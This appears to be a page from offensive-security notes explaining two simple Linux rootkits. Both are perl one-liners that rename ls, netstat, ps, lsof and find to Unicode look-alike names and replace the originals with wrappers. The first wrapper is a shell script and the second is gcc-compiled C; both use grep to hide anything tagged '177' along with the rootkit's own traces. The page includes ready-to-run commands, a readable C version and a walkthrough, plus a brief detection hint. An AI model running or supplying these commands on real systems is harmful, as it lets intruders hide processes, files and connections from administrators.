# Simple Rootkits

## <mark style="color:red;">Shell Rootkit</mark>

{% hint style="danger" %}
#### This rootkit is pretty easy to detect and analyze because it can easily be seen with the file command that programs like `ps` or `ls` have changed the type from an ELF binary to a shell script. After discovering the rootkit, it is also pretty easy to analyze the functionality of it and then selectively find the backdoors hidden by the rootkit.
{% endhint %}

The shell script version is still useful if the system doesn't contain a c compiler:

```
which ls netstat ps lsof find|perl -pe'$s="\x{455}";$n="\x{578}";chop;$o=$_;s/([ltp])s/\1$s/||s/fin/fi$n/;rename$o,$_;open F,"&gt;$o";print F"#!/bin/sh\n$_ \$*|grep -vE \"[$s-$n]|grep|177\"";chmod 493,$o'
```

The which command lists the absolute path of the programs to maniuplate in the rootkit. These absolute paths are passed to a perl one-liner. The perl program starts with defining the variables $s and $n, which are initialized with the Unicode characters u+455 and u+578. These characters look like the ascii characters "s" and "n". Then it copies the filename of the original filename to $o and changes the filename in $\_ by replacing the "s" in ls, netstat, ps and lsof with u+455 and the "n" in find with u+578. The result of these replacements is a new filename which looks exactly like the original filename. The original program is then renamed to the new name and then replaced with a shell script, which calls the renamed original program ($\_) and pipes the output to grep. The grep command filters lines containing one of the following:

* Unicode characters used by the rootkit (\[$s-$n]) => Makes the rootkit self-hiding
* The string "grep" => Don't show that grep is running in the output of ps
* The string "177" => This is used for the stuff which should be hidden by the rootkit.

## <mark style="color:red;">The C Version</mark>

In order to make finding and analyzing the rootkit more difficult, it is also possible to compile small binaries instead of the shell script:

```
which ls netstat ps lsof find|perl -pe'$s="\x{455}";$n="\x{578}";chop;$o=$_;s/([ltp])s/\1$s/||s/fin/fi$n/;rename$o,$_;open F,"|gcc -xc - -o$o";print F qq{int main(int a,char**b){char*c[999999]={"sh","-c","$_ \$*|grep -vE \\"177|\$\$|[$s-$n]|grep\\""};memcpy(c+3,b,8*a);execv("/bin/sh",c);}}'
```

The beginning is pretty much like the first variant of the rootkit. However, insted of directly writing the wrapper program, the perl script opens a pipe to gcc and writes a small C program to this pipe. The following shows a more readable version of the C program:

```
int main(int a,char**b){
  char*c[999999]={"sh","-c","original_program \$*|grep -vE \\"177|\$\$|[$s-$n]|grep\\""};
  memcpy(c+3,b,8*a);
  execv("/bin/sh",c);
}
```

The first line initializes the argument array for execv with "sh -c" and the same shell command as the first variant of the rootkit while the second line copies all remaining arguments from the argv array passed to the wrapper binary to the end of the argument array for execv.
